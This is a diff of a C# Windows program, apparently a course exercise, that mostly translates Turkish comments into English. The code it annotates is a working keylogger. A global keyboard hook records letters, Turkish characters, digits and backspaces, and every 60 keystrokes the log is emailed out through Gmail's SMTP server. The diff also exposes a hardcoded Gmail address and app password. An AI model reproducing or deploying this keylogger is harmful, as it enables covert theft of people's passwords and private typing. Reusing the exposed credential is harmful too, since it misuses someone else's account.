@@ -27,14 +27,16 @@ namespace NtpWeek2
         const int KEYEVENTF_KEYUP = 0x2;
 
 
-        globalKeyboardHook keyboard = new globalKeyboardHook();
-        int number = 0;
-        string log ;
-        bool BigChar = true;
+        globalKeyboardHook keyboard = new globalKeyboardHook(); // Captures all keyboard events in Windows.
+        int number = 0; // counter
+        string log ; // logging
+        bool BigChar = true;// case sensivity
         void ShowKeys()
         {
-            keyboard.HookedKeys.Add(Keys.A);
-            keyboard.HookedKeys.Add(Keys.S);
+            // HookodKeys.Add() : Adds the key in parantheses to the listening list
+            
+            keyboard.HookedKeys.Add(Keys.A);  
+            keyboard.HookedKeys.Add(Keys.S);   
             keyboard.HookedKeys.Add(Keys.D);
             keyboard.HookedKeys.Add(Keys.F);
             keyboard.HookedKeys.Add(Keys.G);
@@ -60,7 +62,7 @@ namespace NtpWeek2
             keyboard.HookedKeys.Add(Keys.O);
             keyboard.HookedKeys.Add(Keys.P);
 
-            //Türkçe Karekterler 
+            //Turkish characters
 
             keyboard.HookedKeys.Add(Keys.OemOpenBrackets);
             keyboard.HookedKeys.Add(Keys.Oem6);
@@ -69,7 +71,7 @@ namespace NtpWeek2
             keyboard.HookedKeys.Add(Keys.OemQuestion);
             keyboard.HookedKeys.Add(Keys.Oem5);
 
-            //Rakamlar
+            //numbers
 
             keyboard.HookedKeys.Add(Keys.NumPad0);
             keyboard.HookedKeys.Add(Keys.NumPad1);
@@ -82,7 +84,7 @@ namespace NtpWeek2
             keyboard.HookedKeys.Add(Keys.NumPad8);
             keyboard.HookedKeys.Add(Keys.NumPad9);
 
-            //Üst Rakamlar
+            //Upper numbers
 
             keyboard.HookedKeys.Add(Keys.D0);
             keyboard.HookedKeys.Add(Keys.D1);
@@ -95,7 +97,7 @@ namespace NtpWeek2
             keyboard.HookedKeys.Add(Keys.D8);
             keyboard.HookedKeys.Add(Keys.D9);
 
-            //nokta , backspace vs
+            //dot, backspace etc.
             keyboard.HookedKeys.Add(Keys.OemPeriod);
             keyboard.HookedKeys.Add(Keys.Back);
 
@@ -120,7 +122,7 @@ namespace NtpWeek2
                     MailMessage txt = new MailMessage();
                     SmtpClient client = new SmtpClient();
 
-                    // Gmail ayarları
+                    // Gmail settings
                     client.Credentials = new System.Net.NetworkCredential("meteburak2003@gmail.com", "kiop oghm lzkp brbo");
                     client.Port = 587;
                     client.Host = "smtp.gmail.com";
@@ -148,14 +150,17 @@ namespace NtpWeek2
         void KeyCombination(object sender , KeyEventArgs e)
         {
 
-            if(number > 59)
+            if(number > 59) 
             {
+                // If is gotten 60 characters , mail is sended and counter resets .
                 Mail();
                 number = 0;
-             //   log = "Bos - ";
+             
             }
             if (e.KeyCode == Keys.CapsLock)
             {
+                // If BigChar is true,the letter is uppercase.
+                // If BigChar is false ,the letter is lowercase.
                 if (BigChar == true)
                     BigChar = false;
                 else
@@ -163,21 +168,22 @@ namespace NtpWeek2
             }
 
 
-            //nokta , backspace vs
+            //dot , backspace vs
             if (e.KeyCode == Keys.OemPeriod)
             {
-
+                // Adds dot(".")
                 log += ".";
-                number++;
+                number++; // (number++) counts the key pressed.
             }
             if (e.KeyCode == Keys.Back)
-            {
+            {   
+                //Prints "Back" to confirm the delete operation. 
 
                 log += "*Back*";
                 number++;
             }
 
-            //Rakamlar
+            // Checking numbers (including numpad and upper numbers)
             if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
             {
 
@@ -241,7 +247,7 @@ namespace NtpWeek2
 
 
 
-            //Türkçe Karekterler
+            //Turkish characters
 
             if (e.KeyCode == Keys.OemOpenBrackets)
             {
@@ -315,7 +321,7 @@ namespace NtpWeek2
             }
 
 
-            //Diğer Karekterler
+            //other characters
 
 
             if (e.KeyCode == Keys.A)
